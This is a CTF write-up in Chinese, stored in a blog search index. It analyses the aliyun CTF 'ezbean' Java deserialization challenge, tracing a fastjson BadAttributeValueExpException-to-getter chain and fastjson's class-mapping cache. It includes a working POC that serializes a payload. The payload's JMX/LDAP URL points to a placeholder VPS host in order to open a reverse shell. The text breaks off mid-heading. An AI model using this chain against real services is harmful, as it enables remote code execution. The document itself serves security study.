<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[aliyun CTF] ezbean分析与思考</title>
      <link href="/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/"/>
      <url>/2023/05/05/ezbean%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="aliyun-CTF-ezbean分析与思考"><a href="#aliyun-CTF-ezbean分析与思考" class="headerlink" title="aliyun CTF ezbean分析与思考"></a>aliyun CTF ezbean分析与思考</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>复现阿里云的时候发现了一个很奇怪、很玄学的点，官方和冠军wp都是一笔带过了，官方也没给exp，就试着自己硬调，调着调着有点上头，应该没人发过吧，我猜的😂</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>FastJson反序列化中有常见的链，BadAttributeValueExpException触发的JSON#toString-》getter方法，这个过程有点复杂，也不是本文的重点，具体可以参考</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson和原生反序列化</a></p><h2 id="0x01-题目背景"><a href="#0x01-题目背景" class="headerlink" title="0x01 题目背景"></a>0x01 题目背景</h2><h3 id="反序列化点"><a href="#反序列化点" class="headerlink" title="反序列化点"></a>反序列化点</h3><p>题目给出了一个可以反序列化参数data传入数据的路由read</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236105.png" alt="image-20230504230327231"></p><blockquote><p>这里的<code>MyObjectInputStream</code>继承自<code>ObjectInputStream</code>,调用readObject方会先进入resolveClass具体调用栈如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236187.png" alt="image-20230504233800680"></p></blockquote><p>跟进resolveClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>   <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<span class="hljs-comment">//*</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进<code>com.ctf.ezser.utils.MyObjectInputStream#contains</code>方法，是一个黑名单过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><span class="hljs-comment">//...  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><blockquote><p>不过经实测这个黑名单似乎起不到过滤的作用</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236143.png" alt="image-20230504234209559"></p></blockquote><h2 id="0x02-问题发现"><a href="#0x02-问题发现" class="headerlink" title="0x02 问题发现"></a>0x02 问题发现</h2><h3 id="限制分析"><a href="#限制分析" class="headerlink" title="限制分析"></a>限制分析</h3><p>fastjson&#x3D;&#x3D;1.2.60&gt;1.2.49</p><p><code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p>这里提一下fastjson中的反序列化机制，由于ObjectInputStream的不安全性，fastjson在调用<code>JSONArray/JSONObject</code>的readObject方法触发反序列化时，会将反序列化过程委托给<code>SecureObjectInputStream</code>处理，这个类可以理解成是安全的<code>ObjectInputStream</code>，下图为委托起点(<code>ObjectInputStream#defaultReadObject</code>)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050236065.png" alt="image-20230504235432194"></p><p>之后的过程感兴趣可以调一下看下调用栈，几个节点如下（太多了，只选了其中几个）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream #defaultReadObject<br>ObjectInputStream #ReadObject<br>ObjectInputStream #ReadObject0<br>ObjectInputStream #readNonProxyDesc<br>SecureObjectInputStream #resolveClass<br></code></pre></td></tr></table></figure><p>关注一下resolveClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>    <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> name.lastIndexOf(<span class="hljs-string">&#x27;[&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index != -<span class="hljs-number">1</span>) &#123;<br>            name = name.substring(index + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">2</span> &amp;&amp; name.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; name.charAt(name.length() - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;;&#x27;</span>) &#123;<br>            name = name.substring(<span class="hljs-number">1</span>, name.length() - <span class="hljs-number">1</span>);<br>        &#125;<br>        ParserConfig.global.checkAutoType(name, <span class="hljs-literal">null</span>, Feature.SupportAutoType.mask);<span class="hljs-comment">//重点，调用了checkAutoType方法</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>反序列化失败的大多数原因都是checkAutoType函数执行过程中抛出了JSONException异常</p></blockquote><p>这个异常大概字符串是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">default</span> constructor not found. <span class="hljs-keyword">class</span> <span class="hljs-title class_">xxxxx</span><br></code></pre></td></tr></table></figure><p>这样的话之前的链子就打不通了，原来有Fastjson反序列化的链子思路是从<code>BadAttributeValueExpException</code>-&gt;<code>JSON#toString</code>-&gt;<code>JSON#toJSONString</code>，进而最后能触发任意类的getter(就是类的方法名以get开头的)，回看这题给的MyBean，里面有个<code>getConnect</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConnect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>     <span class="hljs-built_in">this</span>.conn.connect();<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-comment">//   private JMXConnector conn;</span><br></code></pre></td></tr></table></figure><blockquote><p>只要我们能触发getConnect，将conn设置为RMIConnector，可以触发JNDI注入，之后也就能反弹shell了</p></blockquote><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jmxurl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;service:jmx:rmi:///jndi/ldap://vps_ip:1389/Basic/ReverseShell/vps_ip/3344&quot;</span>;<br><span class="hljs-type">JMXServiceURL</span> <span class="hljs-variable">jmxServiceURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMXServiceURL</span>(jmxurl);<br><span class="hljs-type">RMIConnector</span> <span class="hljs-variable">rmi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIConnector</span>(jmxServiceURL, <span class="hljs-literal">null</span>);<br>com.ctf.ezser.bean.<span class="hljs-type">MyBean</span> <span class="hljs-variable">mb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.ctf.ezser.bean.MyBean(jmxurl,<span class="hljs-string">&quot;sssaaaa&quot;</span>,rmi);<br><br>com.alibaba.fastjson.<span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.alibaba.fastjson.JSONArray();<br>jsonArray.add(mb);<br><br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valfield.setAccessible(<span class="hljs-literal">true</span>);<br>valfield.set(val, jsonArray);<br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(val);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>System.out.println(ret);<br></code></pre></td></tr></table></figure><h3 id="玄学事件"><a href="#玄学事件" class="headerlink" title="玄学事件"></a>玄学事件</h3><p>按理来说，根据上述链子构造的反序列化应该会被SecureObjectInputStream拦截，进而执行<code>checkAutoType</code>然后抛出JSONException异常，导致反序列化失败，但神奇的是前两次反序列化一定失败，而从第三次开始就能成功并反弹shell。并且官方wp也用的这条链子，但写得过于简短，看冠军队的wp说是fj的随机构造函数问题，后来调了一下感觉可能不是这个原因</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237675.png" alt="image-20230505012846237"></p><p>一开始以为三次只是巧合，后来每次验证都是三次。并且第一次是<code>default constructor not found. class xxx.RMIConnector</code>第二次是<code>default constructor not found. class xxx.JMXServiceURL</code></p><p>这里先提一下checkAutoType通过typeName找类的三种方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">//🌟</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>经过测试，最主要的方法是<code>TypeUtils.getClassFromMapping</code>这个方法会去TypeUtils的mappings成员里找是否有以typeName为Name的类（🌟🌟这个很重要 记一下）mappings是静态私有成员，在初始化时就放入了107个常见类（也是SecureObjectInputStream认为是安全的类）</p></blockquote><p>调的过程中发现三次执行的过程中，这个mappings成员的size分别是108、109、110，而在110时反序列化成功，想必大家看到这里都能发现这个关键点了，也能猜测到前两次工作是把抛出异常没找到那个类添加进mappings</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>理论上是说得通了，还得是调试一下来验证</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>这题里能传入checkAutoType去寻找的非原生类只有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">com.ctf.ezser.bean.MyBean <span class="hljs-comment">//反序列化终点，被调用getConnect-》this.conn.connect();</span><br>javax.management.remote.rmi.RMIConnector <span class="hljs-comment">//传入MyBean构造函数给conn赋值</span><br>javax.management.remote.JMXServiceURL  <span class="hljs-comment">//用于传入RMIConnector构造函数</span><br></code></pre></td></tr></table></figure><h3 id="异常信号寻找"><a href="#异常信号寻找" class="headerlink" title="异常信号寻找"></a>异常信号寻找</h3><p>首先先找一下这个一直报错的<code>default constructor not found. class xxx</code>字段，找出来是在<code>JavaBeanInfo#build</code>方法的某处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">if</span> ((!kotlin)<br>            &amp;&amp; !clazz.getName().equals(<span class="hljs-string">&quot;javax.servlet.http.Cookie&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaBeanInfo</span>(clazz, builderClass, <span class="hljs-literal">null</span>, creatorConstructor, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, jsonType, fieldList);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;default constructor not found. &quot;</span> + clazz);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在这题的反序列化过程中kotlin都为false，因此关注第二个条件，经调试，走到这一步的clazz都不会是<code>javax.servlet.http.Cookie</code>，而是上面三个前提条件中的后两个</p></blockquote><p>checkAutoType方法后续会创建一个JavaBeanInfo调用clazz方法，不过前提是前一个if没有成功的return跳出函数，从下面代码可以看出，如果三种方法都找不到class，也就不会提前退出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = TypeUtils.getClassFromMapping(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-comment">//...🌟🌟</span><br>  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>      <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>  &#125;<span class="hljs-comment">//***处</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);<br>    <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p>若没有提前退出会来到上面标识的<code>***</code>处，这里有一个很重要的操作，把还没找到的类的类名typeName添加进TypeUtils的mappings中，使用类加载器加载该类并赋值给clazz，这里可以简单看一下TypeUtils.loadClass关键部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(classLoader != <span class="hljs-literal">null</span>)&#123;<br> clazz = classLoader.loadClass(className);<br> <span class="hljs-keyword">if</span> (cache) &#123;<br>     mappings.put(className, clazz);<br> &#125;<br> <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下传入<code>ParserConifg#checkAutoType</code>的类名会经历以下过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>简单的类名检查，若处于黑名单则抛出异常 autoType is not support xxx<br><span class="hljs-number">2.</span>使用三种方法通过类名来加载类：<br>        TypeUtils.getClassFormMappings (基本都通过这个方法找到)<br>        IdentityHashMap.findClass<br>        ConcurrentHashMap.get<br><span class="hljs-number">3.</span>若找到，会进入以下<span class="hljs-keyword">if</span>进而<span class="hljs-keyword">return</span>找到的类提前退出checkAutoType函数<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-number">4.</span>继续执行，通过TypeUtils的loadClass方法利用类加载器找到类，并将当前类加入TypeUtils的mappings中<br><span class="hljs-number">5.</span>调用JavaBeanInfo的build方法，传入当前类，当类没有无参构造函数时会抛出异常 <span class="hljs-keyword">default</span> constructor not found. xxxx<br></code></pre></td></tr></table></figure><h3 id="第一次反序列化"><a href="#第一次反序列化" class="headerlink" title="第一次反序列化"></a>第一次反序列化</h3><p>首先是入口点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">objectInputStream.readObject();<br></code></pre></td></tr></table></figure><p>接着来到JSONArray#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      JSONObject.SecureObjectInputStream.ensureFields();<br>      <span class="hljs-keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="hljs-literal">null</span> &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;<br>          <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">secIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>.SecureObjectInputStream(in);<br>          <span class="hljs-keyword">try</span> &#123;<br>              secIn.defaultReadObject();<br>              <span class="hljs-keyword">return</span>;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.NotActiveException e) &#123;<br>              <span class="hljs-comment">// skip</span><br>          &#125;<br>      &#125;<br>  <span class="hljs-comment">//。。。</span><br></code></pre></td></tr></table></figure><p>之后就被<code>SecureObjectInputStream</code>劫持了</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237433.png" alt="image-20230505020221637"></p><p>直接来到最关键的checkAutoType方法，可以看到先找的是MyBean</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237274.png" alt="image-20230505020313917"></p><p>跟进checkAutoType方法，前面部分跳过，直接来个经典三个方法寻找类</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237845.png" alt="image-20230505020425672"></p><p>这里可以先跟进一下getClassFromMapping方法，可以看到此时的Mappings（size：107）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237915.png" alt="image-20230505020521779"></p><p>经过三个方法，仍然没有找到类，这也就意味着接下来一定会去到JavaBeanInfo的build方法中(异常抛出点)，不过在这之前会先通过Typeutils的loadClass方法找到类，并添加mappings的数量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>&#125;<br></code></pre></td></tr></table></figure><p>MyBean被添加，size变为108</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238540.png" alt="image-20230505020903956"></p><p>之后就来到了这个死亡异常抛出点JavaBeanInfo的build方法，但你会惊奇的发现，并没有抛出异常，程序继续走到了下一个类RMIConnector传入checkAutoType方法，其实是因为这个if的条件不满足，build函数提前返回</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238797.png" alt="image-20230505021125948"></p><blockquote><p>这也很好理解，那个异常提示的很明显了<code>default constructor not found. class xxx</code>而MyBean明显是有无参构造方法的，这里的defaultConstructor就是获取到了无参构造方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238509.png" alt="image-20230505015849391"></p></blockquote><p>没有异常抛出，无事发生，接着轮到RMIConnector</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050247946.png" alt="image-20230505021320328"></p><p>后面都是一样的操作，三个方法都找不到类，被添加进mappings，size+1</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238031.png" alt="image-20230505021419699"></p><p>然后来到死亡异常抛出点JavaBeanInfo的build方法，没有无参构造函数</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238335.png" alt="image-20230505021538934"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239359.png" alt="image-20230505021549225"></p><p>迎来第一次报错</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239280.png" alt="image-20230505021625294"></p><h3 id="第二次反序列化"><a href="#第二次反序列化" class="headerlink" title="第二次反序列化"></a>第二次反序列化</h3><p>接着进行第二次，发送payload</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239992.png" alt="image-20230505021702771"></p><p>MyBean和RMIConnector的checkAutoType就先跳过，这两类以及被加入mappings了，是可以通过三个方法后的这部分代码提前退出的,就不再跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接开始分析JMXServiceURL，三个方法找不到类，调用laodClass</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239172.png" alt="image-20230505021939903"></p><p>加入mappings， size+1，至此，可以支持反序列化成功的mappigns已经装填好</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239392.png" alt="image-20230505022008745"></p><p>之后又因为没有无参构造方法抛出异常</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239543.png" alt="image-20230505022107758"></p><p>迎来第二个报错</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239596.png" alt="image-20230505022142322"></p><h3 id="第三次反序列化（也是反序列化成功的开始）"><a 